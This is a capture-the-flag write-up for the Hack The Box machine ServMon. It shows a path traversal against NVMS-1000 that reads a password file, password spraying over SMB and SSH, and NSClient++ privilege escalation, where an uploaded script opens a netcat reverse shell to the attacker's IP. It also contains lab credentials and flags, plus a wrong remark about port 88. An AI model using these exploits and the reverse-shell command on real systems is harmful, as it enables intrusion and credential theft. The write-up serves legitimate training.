## Intro

![](MediaFiles/Pasted%20image%2020260424213231.png)
Tags: #windows #NotAssumedBreach #WebApp #ftp #PortForwarding #3rd-party-vuln-app #OSCPpath #easy

-----
# Reconnaissance

## Add target to hosts
```shell
echo '10.129.33.164 servmon.htb' | sudo tee -a /etc/hosts
```

## Port scan
### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n servmon.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-24 13:31 -0400
Nmap scan report for servmon.htb (10.129.33.164)
Host is up (0.053s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
```
the target appears to be a dc, one indicator is port 88 being open
### Scan specific open TCP ports
```shell
sudo nmap -p21,22,80,135,445,5666,6063,6699,8443 -A servmon.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-24 13:32 -0400
Nmap scan report for servmon.htb (10.129.33.164)
Host is up (0.047s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp   open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|     AuthInfo:
|   GenericLines, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   GetRequest, X11Probe: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6063/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.98%I=7%D=4/24%Time=69EBA94E%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20t
SF:ext/html\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n")%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:
SF:\x20text/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuth
SF:Info:\x20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//D
SF:TD\x20XHTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/x
SF:html1/DTD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://ww
SF:w\.w3\.org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r
SF:\n\x20\x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";
SF:\r\n\x20\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html
SF:>\r\n")%r(RTSPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20t
SF:ext/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:
SF:\x20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x2
SF:0XHTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1
SF:/DTD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3
SF:\.org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x2
SF:0\x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\
SF:x20\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n
SF:")%r(X11Probe,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-typ
SF:e:\x20text/html\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuth
SF:Info:\x20\r\n\r\n")%r(FourOhFourRequest,65,"HTTP/1\.1\x20404\x20Not\x20
SF:Found\r\nContent-type:\x20text/html\r\nContent-Length:\x200\r\nConnecti
SF:on:\x20close\r\nAuthInfo:\x20\r\n\r\n")%r(GenericLines,1B4,"HTTP/1\.1\x
SF:20200\x20OK\r\nContent-type:\x20text/html\r\nContent-Length:\x20340\r\n
SF:Connection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20h
SF:tml\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Transitional//EN\"\x
SF:20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transitional\.dtd\">\r\n\r
SF:\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n<head>\r\n\x20\
SF:x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script\x20type=\"text/ja
SF:vascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window\.location\.href\x
SF:20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</script>\r\n</head>\r\
SF:n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.98%T=SSL%I=7%D=4/24%Time=69EBA954%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04jobs\x12\x02\x1
SF:8\x0f\x12\x0f")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x
SF:2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.
SF:1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(R
SF:TSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocumen
SF:t\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length
SF::\x2018\r\n\r\nDocument\x20not\x20found");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|2022|2012|2016 (96%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows Server 2019 (95%), Windows Server 2019 (92%), Microsoft Windows 10 1909 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows 10 1709 - 21H2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 20H2 (90%), Microsoft Windows 10 20H2 - 21H1 (90%), Microsoft Windows Server 2016 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-04-24T17:34:50
|_  start_date: N/A
|_clock-skew: -4s

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   46.13 ms 10.10.14.1
2   46.31 ms servmon.htb (10.129.33.164)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.25 seconds

```

## FTP

### anonymous ✅

found 2 txt files via anonymous ftp: 
```shell
└─$ ftp anonymous@servmon.htb                                                                                                    
Connected to servmon.htb.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49678|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
ftp> ls
229 Entering Extended Passive Mode (|||49679|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
ftp> pwd
Remote directory: /
ftp> ls
229 Entering Extended Passive Mode (|||49680|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49681|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nadine
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49682|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  168 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
229 Entering Extended Passive Mode (|||49684|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************|   168        3.48 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 6 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
168 bytes received in 00:00 (3.31 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49685|)
150 Opening ASCII mode data connection.
02-28-22  07:36PM                  168 Confidential.txt
226 Transfer complete.
ftp> cd ..
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49686|)
150 Opening ASCII mode data connection.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nathan
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49688|)
150 Opening ASCII mode data connection.
02-28-22  07:36PM                  182 Notes to do.txt
226 Transfer complete.
ftp> get Notes\ to\ do.txt
local: Notes to do.txt remote: Notes to do.txt
229 Entering Extended Passive Mode (|||49690|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************|   182        3.78 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 4 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
182 bytes received in 00:00 (3.62 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49691|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  182 Notes to do.txt
226 Transfer complete.
ftp> cd ..
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49692|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd ..
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49693|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd ..
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49694|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
ftp> exit
221 Goodbye.

```

### usernames obtained
```
nathan
nadine
```

#### Files obtained 

##### hints
```shell
└─$ cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

```
└─$ cat Notes\ to\ do.txt                                                                                                        
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

## WebApp 

### version

![](MediaFiles/Pasted%20image%2020260424204353.png)
the version here is `NVMS-1000` 

---
# Foothold

### Vulnerable webapp version

found this exploit for it:
https://www.exploit-db.com/exploits/47774

#### Path traversal

using burp
`Request`
```powershell
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1

Host: servmon.htb

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Connection: keep-alive
```
`response`
```powershell
HTTP/1.1 200 OK

Content-type: 
Content-Length: 92
Connection: close
AuthInfo: 

; for 16-bit app support

[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

nice, now lets remember the files we have obtained, for nathan, the note said that a `Passwords.txt` exists on his desktop, so lets use path traversal for this:

`request`
```powershell
GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1

Host: servmon.htb

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Connection: keep-alive
```

##### creds obtained

`response`
```powershell
HTTP/1.1 200 OK
Content-type: text/plain
Content-Length: 156
Connection: close
AuthInfo: 

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

### Password Spraying

#### SMB ❌

```shell
nxc smb servmon.htb -u users.txt -p passwords.txt --continue-on-success
```

```shell
SMB         10.129.33.164   445    SERVMON          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:None)
SMB         10.129.33.164   445    SERVMON          [-] ServMon\Nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.129.33.164   445    SERVMON          [-] ServMon\Nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.129.33.164   445    SERVMON          [-] ServMon\Nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.129.33.164   445    SERVMON          [-] ServMon\Nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.129.33.164   445    SERVMON          [-] ServMon\Nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.129.33.164   445    SERVMON          [-] ServMon\Nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.129.33.164   445    SERVMON          [-] ServMon\Nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
SMB         10.129.33.164   445    SERVMON          [+] ServMon\Nadine:L1k3B1gBut7s@W0rk 
SMB         10.129.33.164   445    SERVMON          [-] ServMon\Nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
SMB         10.129.33.164   445    SERVMON          [-] ServMon\Nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
SMB         10.129.33.164   445    SERVMON          [-] ServMon\Nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE 
```
nice! seems like `Nadine` with password `1k3B1gBut7s@W0rk` was successfull

```shell
nxc smb servmon.htb -u Nadine -p L1k3B1gBut7s@W0rk -M spider_plus
```

```powershell
SMB         10.129.33.164   445    SERVMON          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:None)
SMB         10.129.33.164   445    SERVMON          [+] ServMon\Nadine:L1k3B1gBut7s@W0rk 
SPIDER_PLUS 10.129.33.164   445    SERVMON          [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.33.164   445    SERVMON          [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.33.164   445    SERVMON          [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.33.164   445    SERVMON          [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.33.164   445    SERVMON          [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.33.164   445    SERVMON          [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.33.164   445    SERVMON          [*]  OUTPUT_FOLDER: /home/ch3ckm8/.nxc/modules/nxc_spider_plus
SMB         10.129.33.164   445    SERVMON          [*] Enumerated shares
SMB         10.129.33.164   445    SERVMON          Share           Permissions     Remark
SMB         10.129.33.164   445    SERVMON          -----           -----------     ------
SMB         10.129.33.164   445    SERVMON          ADMIN$                          Remote Admin
SMB         10.129.33.164   445    SERVMON          C$                              Default share
SMB         10.129.33.164   445    SERVMON          IPC$            READ            Remote IPC
SPIDER_PLUS 10.129.33.164   445    SERVMON          [+] Saved share-file metadata to "/home/ch3ckm8/.nxc/modules/nxc_spider_plus/10.129.33.164.json".
SPIDER_PLUS 10.129.33.164   445    SERVMON          [*] SMB Shares:           3 (ADMIN$, C$, IPC$)
SPIDER_PLUS 10.129.33.164   445    SERVMON          [*] SMB Readable Shares:  1 (IPC$)
SPIDER_PLUS 10.129.33.164   445    SERVMON          [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.33.164   445    SERVMON          [*] Total folders found:  0
SPIDER_PLUS 10.129.33.164   445    SERVMON          [*] Total files found:    0
```

#### SSH ✅

```shell
nxc ssh servmon.htb -u users.txt -p passwords.txt --continue-on-success
```

```shell
SSH         10.129.33.164   22     servmon.htb      [*] SSH-2.0-OpenSSH_for_Windows_8.0
SSH         10.129.33.164   22     servmon.htb      [-] Nathan:1nsp3ctTh3Way2Mars!
SSH         10.129.33.164   22     servmon.htb      [-] Nadine:1nsp3ctTh3Way2Mars!
SSH         10.129.33.164   22     servmon.htb      [-] Nathan:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.33.164   22     servmon.htb      [-] Nadine:Th3r34r3To0M4nyTrait0r5!
SSH         10.129.33.164   22     servmon.htb      [-] Nathan:B3WithM30r4ga1n5tMe
SSH         10.129.33.164   22     servmon.htb      [-] Nadine:B3WithM30r4ga1n5tMe
SSH         10.129.33.164   22     servmon.htb      [-] Nathan:L1k3B1gBut7s@W0rk
SSH         10.129.33.164   22     servmon.htb      [+] Nadine:L1k3B1gBut7s@W0rk  Windows - Shell access!
SSH         10.129.33.164   22     servmon.htb      [-] Nathan:0nly7h3y0unGWi11F0l10w
SSH         10.129.33.164   22     servmon.htb      [-] Nathan:IfH3s4b0Utg0t0H1sH0me
```

## Shell as nadine

ssh and grab user flag
```powershell
└─$ ssh nadine@servmon.htb                                                                                                        
The authenticity of host 'servmon.htb (10.129.33.164)' can't be established.
ED25519 key fingerprint is: SHA256:WctzSeuXs6dqa7LqHkfVZ38Pppc/KRlSmEvNtPlwSoQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'servmon.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
nadine@servmon.htb's password: 
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine

nadine@SERVMON C:\Users\Nadine>cd Desktop 

nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt 
37e52505f4008cb3ed3ee8b9c5c815f6        
                                        
nadine@SERVMON C:\Users\Nadine\Desktop> 
```

-----
# Privesc


## Privileges

```powershell
nadine@SERVMON C:\Users\Nadine\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
nothing interesting here

## File enumeration

```powershell
nadine@SERVMON C:\RecData>dir 
 Volume in drive C has no label. 
 Volume Serial Number is 20C1-47A1

 Directory of C:\RecData

02/28/2022  08:02 PM    <DIR>          .
02/28/2022  08:02 PM    <DIR>          ..
02/28/2022  08:02 PM             8,192 RecordInfoDB.db3
02/28/2022  08:02 PM                 0 RecordInfoDB.db3-journal
               2 File(s)          8,192 bytes
               2 Dir(s)   6,117,113,856 bytes free
nadine@SERVMON C:\>cd "Program Files"

nadine@SERVMON C:\Program Files>dir 
 Volume in drive C has no label. 
 Volume Serial Number is 20C1-47A1

 Directory of C:\Program Files

02/28/2022  07:55 PM    <DIR>          .
02/28/2022  07:55 PM    <DIR>          ..
03/01/2022  02:20 AM    <DIR>          Common Files
11/11/2019  07:52 PM    <DIR>          internet explorer
02/28/2022  07:07 PM    <DIR>          MSBuild
02/28/2022  07:55 PM    <DIR>          NSClient++
02/28/2022  07:46 PM    <DIR>          NVMS-1000
02/28/2022  07:32 PM    <DIR>          OpenSSH-Win64
02/28/2022  07:07 PM    <DIR>          Reference Assemblies
02/28/2022  06:44 PM    <DIR>          VMware
11/11/2019  07:52 PM    <DIR>          Windows Defender
11/11/2019  07:52 PM    <DIR>          Windows Defender Advanced Threat Protection
09/15/2018  12:19 AM    <DIR>          Windows Mail
11/11/2019  07:52 PM    <DIR>          Windows Media Player
09/15/2018  12:19 AM    <DIR>          Windows Multimedia Platform
09/15/2018  12:28 AM    <DIR>          windows nt
11/11/2019  07:52 PM    <DIR>          Windows Photo Viewer
09/15/2018  12:19 AM    <DIR>          Windows Portable Devices
09/15/2018  12:19 AM    <DIR>          Windows Security
02/28/2022  07:25 PM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              20 Dir(s)   6,116,589,568 bytes free

```

### Third party program found

from the above snippet, i observed `NSClient++` which did not seem systemic to me
Also, lets remember that we found this also in port 8443 of our nmap scan
### Exploit found

searched for exploits for this program
```shell
└─$ searchsploit nsclient
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
NSClient++ 0.5.2.35 - Authenticated Remote Code Execution  | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation                 | windows/local/46802.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(ch3ckm8㉿kali)-[~]
└─$ searchsploit -m 46802
  Exploit: NSClient++ 0.5.2.35 - Privilege Escalation
      URL: https://www.exploit-db.com/exploits/46802
     Path: /usr/share/exploitdb/exploits/windows/local/46802.txt
    Codes: N/A
 Verified: False
File Type: ASCII text, with very long lines (466)
Copied to: /home/ch3ckm8/46802.txt
```

#### Executing exploit

#### 1. display pass
```powershell
nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT
```

#### 2. port forwarding port 8443

```shell
ssh -L 8443:127.0.0.1:8443 nadine@servmon.htb
```
then navigate :
```
https://localhost:8443
```
![](MediaFiles/Pasted%20image%2020260424211917.png)
login with password we have found earlier `ew2x6SsGTxjRwXOT`
![](MediaFiles/Pasted%20image%2020260424211952.png)
we are logged in now

#### 3. transfer netcat

```shell
python3 -m http.server 8001
```
current dir: Nadine/Desktop
```powershell
powershell -c wget 10.10.14.217:8001/nc.exe -outfile nc.exe
```

#### 4. upload malicious bat script

```shell
curl -k -i -u admin:ew2x6SsGTxjRwXOT -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/ch3ckm8.bat -d "C:\Users\Nadine\Desktop\nc.exe -e cmd.exe 10.10.14.217 3333"
```

#### 5. trigger malicious bat script

```shell
curl -k -u admin:ew2x6SsGTxjRwXOT "https://127.0.0.1:8443/api/v1/queries/ch3ckm8/commands/execute?time=1m/"
```

#### 6. rev shell

```shell
nc -lvnp 3333
```

## Shell as Administrator

```powershell
listening on [any] 3333 ...
connect to [10.10.14.217] from (UNKNOWN) [10.129.33.164] 50151
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>echo User: %USERNAME% && echo Hostname: %COMPUTERNAME% && echo Whoami: && whoami && ipconfig /all && echo Root.txt Content: && type "C:\Users\Administrator\Desktop\root.txt"
echo User: %USERNAME% && echo Hostname: %COMPUTERNAME% && echo Whoami: && whoami && ipconfig /all && echo Root.txt Content: && type "C:\Users\Administrator\Desktop\root.txt"


User: SERVMON$ 
Hostname: SERVMON 
Whoami: 
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ServMon
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : .htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-94-C3-CD
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::a065:c924:b82c:eb18(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::a065:c924:b82c:eb18%6(Preferred)                                
   IPv4 Address. . . . . . . . . . . : 10.129.33.164(Preferred)                                              
   Subnet Mask . . . . . . . . . . . : 255.255.0.0                                                           
   Lease Obtained. . . . . . . . . . : Friday, April 24, 2026 10:28:56 AM                                    
   Lease Expires . . . . . . . . . . : Friday, April 24, 2026 11:28:56 AM                                    
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:9b51%6                                            
                                       10.129.0.1                                                            
   DHCP Server . . . . . . . . . . . : 10.10.10.2                                                            
   DHCPv6 IAID . . . . . . . . . . . : 100683862                                                             
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-31-7D-60-A4-00-50-56-94-C3-CD                             
   DNS Servers . . . . . . . . . . . : 127.0.0.1                                                             
   NetBIOS over Tcpip. . . . . . . . : Enabled                                                               
Root.txt Content:                                                                                            
5836139c7e9e9b264cb6a97c481029f1

```

```powershell
echo User: %USERNAME% && echo Hostname: %COMPUTERNAME% && echo Whoami: && whoami && ipconfig /all && echo Root.txt Content: && type "C:\Users\Administrator\Desktop\root.txt"
```

----------
# Summary






-----
# Sidenotes

A fairly easy windows machine, enumeration here was key for initial access. As for the privesc part filesystem enumeration and especially installed 3rd party apps paved the way towards Administrator

![](MediaFiles/Pasted%20image%2020260424213258.png)